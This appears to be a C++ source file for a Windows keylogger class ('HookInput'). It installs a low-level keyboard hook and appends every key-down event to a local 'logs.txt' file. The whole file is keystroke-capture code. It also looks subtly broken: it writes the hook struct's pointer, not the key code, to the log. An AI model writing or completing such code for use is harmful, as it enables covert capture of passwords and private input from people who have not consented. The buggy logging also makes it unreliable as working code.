#include "HookInput.h"


void HookInput::startTracking(void * pParam)
{
	logFile.open("logs.txt", std::ios::app);
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);

	MSG msg{ nullptr };
	while (GetMessage(&msg, nullptr, 0, 0) != 0);
}

void HookInput::stopTracking()
{
	UnhookWindowsHookEx(keyboardHook);
}

LRESULT HookInput::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	//a key was pressed
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
	{
		logFile << key;
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
